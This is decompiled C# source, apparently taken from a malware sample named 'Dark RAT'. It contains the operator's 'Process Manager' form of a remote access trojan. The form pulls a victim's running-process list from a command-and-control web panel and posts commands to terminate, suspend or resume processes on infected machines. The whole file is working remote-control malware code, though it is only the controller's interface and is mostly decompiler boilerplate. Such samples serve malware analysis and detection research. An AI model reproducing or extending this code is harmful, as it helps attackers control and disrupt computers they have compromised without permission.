// Decompiled with JetBrains decompiler
// Type: Dark_RAT.proces
// Assembly: Dark RAT, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C824395-872F-43D5-A237-CC243F82B456
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Flooder.gen-66512a2c31adfe77fb66c2c824e55509ba2cce70d158e850f0e56e3dc664f420.exe

using Dark_RAT.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace Dark_RAT
{
  [DesignerGenerated]
  public class proces : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("ListView1")]
    private ListView _ListView1;
    [AccessedThroughProperty("ColumnHeader1")]
    private ColumnHeader _ColumnHeader1;
    [AccessedThroughProperty("ColumnHeader2")]
    private ColumnHeader _ColumnHeader2;
    [AccessedThroughProperty("ColumnHeader3")]
    private ColumnHeader _ColumnHeader3;
    [AccessedThroughProperty("ColumnHeader4")]
    private ColumnHeader _ColumnHeader4;
    [AccessedThroughProperty("menu")]
    private ContextMenuStrip _menu;
    [AccessedThroughProperty("TerminateToolStripMenuItem")]
    private ToolStripMenuItem _TerminateToolStripMenuItem;
    [AccessedThroughProperty("SuspendToolStripMenuItem")]
    private ToolStripMenuItem _SuspendToolStripMenuItem;
    [AccessedThroughProperty("ResumeToolStripMenuItem")]
    private ToolStripMenuItem _ResumeToolStripMenuItem;
    [AccessedThroughProperty("RefreshToolStripMenuItem")]
    private ToolStripMenuItem _RefreshToolStripMenuItem;
    [AccessedThroughProperty("RequestToolStripMenuItem")]
    private ToolStripMenuItem _RequestToolStripMenuItem;

    [DebuggerNonUserCode]
    static proces()
    {
    }

    [DebuggerNonUserCode]
    public proces()
    {
      this.Load += new EventHandler(this.proces_Load);
      proces.__ENCAddToList((object) this);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (proces.__ENCList)
      {
        if (proces.__ENCList.Count == proces.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (proces.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (proces.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                proces.__ENCList[index1] = proces.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          proces.__ENCList.RemoveRange(index1, checked (proces.__ENCList.Count - index1));
          proces.__ENCList.Capacity = proces.__ENCList.Count;
        }
        proces.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (proces));
      this.ListView1 = new ListView();
      this.ColumnHeader1 = new ColumnHeader();
      this.ColumnHeader2 = new ColumnHeader();
      this.ColumnHeader3 = new ColumnHeader();
      this.ColumnHeader4 = new ColumnHeader();
      this.menu = new ContextMenuStrip(this.components);
      this.TerminateToolStripMenuItem = new ToolStripMenuItem();
      this.SuspendToolStripMenuItem = new ToolStripMenuItem();
      this.ResumeToolStripMenuItem = new ToolStripMenuItem();
      this.RefreshToolStripMenuItem = new ToolStripMenuItem();
      this.RequestToolStripMenuItem = new ToolStripMenuItem();
      this.menu.SuspendLayout();
      this.SuspendLayout();
      this.ListView1.Columns.AddRange(new ColumnHeader[4]
      {
        this.ColumnHeader1,
        this.ColumnHeader2,
        this.ColumnHeader3,
        this.ColumnHeader4
      });
      this.ListView1.ContextMenuStrip = this.menu;
      this.ListView1.Dock = DockStyle.Fill;
      this.ListView1.Location = new Point(0, 0);
      this.ListView1.Name = "ListView1";
      ListView listView1 = this.ListView1;
      Size size1 = new Size(650, 355);
      Size size2 = size1;
      listView1.Size = size2;
      this.ListView1.TabIndex = 4;
      this.ListView1.UseCompatibleStateImageBehavior = false;
      this.ListView1.View = View.Details;
      this.ColumnHeader1.Text = "Name";
      this.ColumnHeader1.Width = 102;
      this.ColumnHeader2.Text = "Process ID";
      this.ColumnHeader2.Width = 192;
      this.ColumnHeader3.Text = "Session ID";
      this.ColumnHeader3.Width = 189;
      this.ColumnHeader4.Text = "Window Title";
      this.ColumnHeader4.Width = 163;
      this.menu.Items.AddRange(new ToolStripItem[5]
      {
        (ToolStripItem) this.TerminateToolStripMenuItem,
        (ToolStripItem) this.SuspendToolStripMenuItem,
        (ToolStripItem) this.ResumeToolStripMenuItem,
        (ToolStripItem) this.RefreshToolStripMenuItem,
        (ToolStripItem) this.RequestToolStripMenuItem
      });
      this.menu.Name = "menu";
      ContextMenuStrip menu = this.menu;
      size1 = new Size(129, 114);
      Size size3 = size1;
      menu.Size = size3;
      this.TerminateToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("TerminateToolStripMenuItem.Image");
      this.TerminateToolStripMenuItem.Name = "TerminateToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem1 = this.TerminateToolStripMenuItem;
      size1 = new Size(128, 22);
      Size size4 = size1;
      toolStripMenuItem1.Size = size4;
      this.TerminateToolStripMenuItem.Text = "Terminate";
      this.SuspendToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("SuspendToolStripMenuItem.Image");
      this.SuspendToolStripMenuItem.Name = "SuspendToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem2 = this.SuspendToolStripMenuItem;
      size1 = new Size(128, 22);
      Size size5 = size1;
      toolStripMenuItem2.Size = size5;
      this.SuspendToolStripMenuItem.Text = "Suspend";
      this.ResumeToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("ResumeToolStripMenuItem.Image");
      this.ResumeToolStripMenuItem.Name = "ResumeToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem3 = this.ResumeToolStripMenuItem;
      size1 = new Size(128, 22);
      Size size6 = size1;
      toolStripMenuItem3.Size = size6;
      this.ResumeToolStripMenuItem.Text = "Resume";
      this.RefreshToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RefreshToolStripMenuItem.Image");
      this.RefreshToolStripMenuItem.Name = "RefreshToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem4 = this.RefreshToolStripMenuItem;
      size1 = new Size(128, 22);
      Size size7 = size1;
      toolStripMenuItem4.Size = size7;
      this.RefreshToolStripMenuItem.Text = "Refresh";
      this.RequestToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RequestToolStripMenuItem.Image");
      this.RequestToolStripMenuItem.Name = "RequestToolStripMenuItem";
      ToolStripMenuItem toolStripMenuItem5 = this.RequestToolStripMenuItem;
      size1 = new Size(128, 22);
      Size size8 = size1;
      toolStripMenuItem5.Size = size8;
      this.RequestToolStripMenuItem.Text = "Request";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
      size1 = new Size(650, 355);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.ListView1);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.MaximizeBox = false;
      this.Name = nameof (proces);
      this.Text = "Process Manager";
      this.menu.ResumeLayout(false);
      this.ResumeLayout(false);
    }

    internal virtual ListView ListView1
    {
      [DebuggerNonUserCode] get => this._ListView1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ListView1 = value;
    }

    internal virtual ColumnHeader ColumnHeader1
    {
      [DebuggerNonUserCode] get => this._ColumnHeader1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ColumnHeader1 = value;
    }

    internal virtual ColumnHeader ColumnHeader2
    {
      [DebuggerNonUserCode] get => this._ColumnHeader2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ColumnHeader2 = value;
    }

    internal virtual ColumnHeader ColumnHeader3
    {
      [DebuggerNonUserCode] get => this._ColumnHeader3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ColumnHeader3 = value;
    }

    internal virtual ColumnHeader ColumnHeader4
    {
      [DebuggerNonUserCode] get => this._ColumnHeader4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._ColumnHeader4 = value;
    }

    internal virtual ContextMenuStrip menu
    {
      [DebuggerNonUserCode] get => this._menu;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._menu = value;
    }

    internal virtual ToolStripMenuItem TerminateToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._TerminateToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TerminateToolStripMenuItem_Click);
        if (this._TerminateToolStripMenuItem != null)
          this._TerminateToolStripMenuItem.Click -= eventHandler;
        this._TerminateToolStripMenuItem = value;
        if (this._TerminateToolStripMenuItem == null)
          return;
        this._TerminateToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem SuspendToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._SuspendToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SuspendToolStripMenuItem_Click);
        if (this._SuspendToolStripMenuItem != null)
          this._SuspendToolStripMenuItem.Click -= eventHandler;
        this._SuspendToolStripMenuItem = value;
        if (this._SuspendToolStripMenuItem == null)
          return;
        this._SuspendToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem ResumeToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._ResumeToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ResumeToolStripMenuItem_Click);
        if (this._ResumeToolStripMenuItem != null)
          this._ResumeToolStripMenuItem.Click -= eventHandler;
        this._ResumeToolStripMenuItem = value;
        if (this._ResumeToolStripMenuItem == null)
          return;
        this._ResumeToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem RefreshToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._RefreshToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.RefreshToolStripMenuItem_Click);
        if (this._RefreshToolStripMenuItem != null)
          this._RefreshToolStripMenuItem.Click -= eventHandler;
        this._RefreshToolStripMenuItem = value;
        if (this._RefreshToolStripMenuItem == null)
          return;
        this._RefreshToolStripMenuItem.Click += eventHandler;
      }
    }

    internal virtual ToolStripMenuItem RequestToolStripMenuItem
    {
      [DebuggerNonUserCode] get => this._RequestToolStripMenuItem;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.RequestToolStripMenuItem_Click);
        if (this._RequestToolStripMenuItem != null)
          this._RequestToolStripMenuItem.Click -= eventHandler;
        this._RequestToolStripMenuItem = value;
        if (this._RequestToolStripMenuItem == null)
          return;
        this._RequestToolStripMenuItem.Click += eventHandler;
      }
    }

    private void proces_Load(object sender, EventArgs e)
    {
      try
      {
        string Expression1 = new WebClient().DownloadString(MyProject.Forms.program.TextBox1.Text + "other/process/data.php?action=read");
        int num = Conversions.ToInteger("0");
        this.ListView1.Items.Clear();
        string[] strArray1 = Strings.Split(Expression1, "\r\n");
        int index = 0;
        while (index < strArray1.Length)
        {
          string Expression2 = strArray1[index];
          if (Expression2.ToString().Contains("|"))
          {
            string[] strArray2 = Strings.Split(Expression2, "|");
            this.ListView1.Items.Add(strArray2[0]);
            this.ListView1.Items[num].SubItems.Add(strArray2[1]);
            this.ListView1.Items[num].SubItems.Add(strArray2[2]);
            this.ListView1.Items[num].SubItems.Add(strArray2[3]);
            num = checked ((int) Math.Round(unchecked (Conversion.Val((object) num) + Conversion.Val("1"))));
          }
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void TerminateToolStripMenuItem_Click(object sender, EventArgs e)
    {
label_1:
      int num1;
      int num2;
      try
      {
        int num3 = 1;
        string str = "";
label_2:
        num3 = 2;
        IEnumerator enumerator1 = this.ListView1.SelectedItems.GetEnumerator();
        goto label_7;
label_4:
        ProjectData.ClearProjectError();
        num1 = -2;
label_5:
        num3 = 4;
        ListViewItem current1;
        str = current1.SubItems[0].Text;
label_6:
        num3 = 5;
label_7:
        if (enumerator1.MoveNext())
        {
          current1 = (ListViewItem) enumerator1.Current;
          goto label_4;
        }
        else if (enumerator1 is IDisposable)
          (enumerator1 as IDisposable).Dispose();
label_11:
        num3 = 6;
        IEnumerator enumerator2 = this.ListView1.Items.GetEnumerator();
        goto label_17;
label_13:
        num3 = 7;
        ListViewItem current2;
        if (!current2.Selected)
          goto label_15;
label_14:
        num3 = 8;
        this.ListView1.Items.Remove(current2);
label_15:
label_16:
        num3 = 10;
label_17:
        if (enumerator2.MoveNext())
        {
          current2 = (ListViewItem) enumerator2.Current;
          goto label_13;
        }
        else if (enumerator2 is IDisposable)
          (enumerator2 as IDisposable).Dispose();
label_21:
        num3 = 11;
        MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|closeprocess|" + str));
        goto label_28;
label_23:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_4;
              case 4:
                goto label_5;
              case 5:
                goto label_6;
              case 6:
                goto label_11;
              case 7:
                goto label_13;
              case 8:
                goto label_14;
              case 9:
                goto label_15;
              case 10:
                goto label_16;
              case 11:
                goto label_21;
              case 12:
                goto label_28;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_23;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_28:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
    {
      try
      {
        string Expression1 = new WebClient().DownloadString(MyProject.Forms.program.TextBox1.Text + "other/process/data.php?action=read");
        int num = Conversions.ToInteger("0");
        this.ListView1.Items.Clear();
        string[] strArray1 = Strings.Split(Expression1, "\r\n");
        int index = 0;
        while (index < strArray1.Length)
        {
          string Expression2 = strArray1[index];
          if (Expression2.ToString().Contains("|"))
          {
            string[] strArray2 = Strings.Split(Expression2, "|");
            this.ListView1.Items.Add(strArray2[0]);
            this.ListView1.Items[num].SubItems.Add(strArray2[1]);
            this.ListView1.Items[num].SubItems.Add(strArray2[2]);
            this.ListView1.Items[num].SubItems.Add(strArray2[3]);
            num = checked ((int) Math.Round(unchecked (Conversion.Val((object) num) + Conversion.Val("1"))));
          }
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void RequestToolStripMenuItem_Click(object sender, EventArgs e) => MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|writeprocesses|"));

    private void SuspendToolStripMenuItem_Click(object sender, EventArgs e)
    {
label_1:
      int num1;
      int num2;
      try
      {
        int num3 = 1;
        string str = "";
label_2:
        num3 = 2;
        IEnumerator enumerator = this.ListView1.SelectedItems.GetEnumerator();
        goto label_7;
label_4:
        ProjectData.ClearProjectError();
        num1 = -2;
label_5:
        num3 = 4;
        ListViewItem current;
        str = current.SubItems[0].Text;
label_6:
        num3 = 5;
label_7:
        if (enumerator.MoveNext())
        {
          current = (ListViewItem) enumerator.Current;
          goto label_4;
        }
        else if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
label_11:
        num3 = 6;
        MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|suspendprocess|" + str));
        goto label_18;
label_13:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_4;
              case 4:
                goto label_5;
              case 5:
                goto label_6;
              case 6:
                goto label_11;
              case 7:
                goto label_18;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_13;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_18:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private void ResumeToolStripMenuItem_Click(object sender, EventArgs e)
    {
label_1:
      int num1;
      int num2;
      try
      {
        int num3 = 1;
        string str = "";
label_2:
        num3 = 2;
        IEnumerator enumerator = this.ListView1.SelectedItems.GetEnumerator();
        goto label_7;
label_4:
        ProjectData.ClearProjectError();
        num1 = -2;
label_5:
        num3 = 4;
        ListViewItem current;
        str = current.SubItems[0].Text;
label_6:
        num3 = 5;
label_7:
        if (enumerator.MoveNext())
        {
          current = (ListViewItem) enumerator.Current;
          goto label_4;
        }
        else if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
label_11:
        num3 = 6;
        MyProject.Forms.program.PostData((object) (MyProject.Forms.program.Label1.Text + "|resumeprocess|" + str));
        goto label_18;
label_13:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_2;
              case 3:
                goto label_4;
              case 4:
                goto label_5;
              case 5:
                goto label_6;
              case 6:
                goto label_11;
              case 7:
                goto label_18;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_13;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_18:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }
  }
}
